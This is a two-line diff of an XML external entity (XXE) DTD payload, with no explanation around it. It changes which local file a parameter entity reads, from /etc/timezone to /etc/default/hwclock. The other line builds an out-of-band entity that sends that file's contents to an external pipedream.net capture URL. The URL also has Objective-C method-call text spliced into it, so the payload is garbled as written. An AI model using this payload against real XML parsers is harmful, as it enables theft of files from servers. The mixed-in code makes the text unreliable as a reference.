@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/timezone">
+<!ENTITY % file SYSTEM "file:///etc/default/hwclock">
 <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://enra6g3n40rma.x.pipedream.net/[hostStr stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet alphanumericCharacterSet]] ?%file;'>">
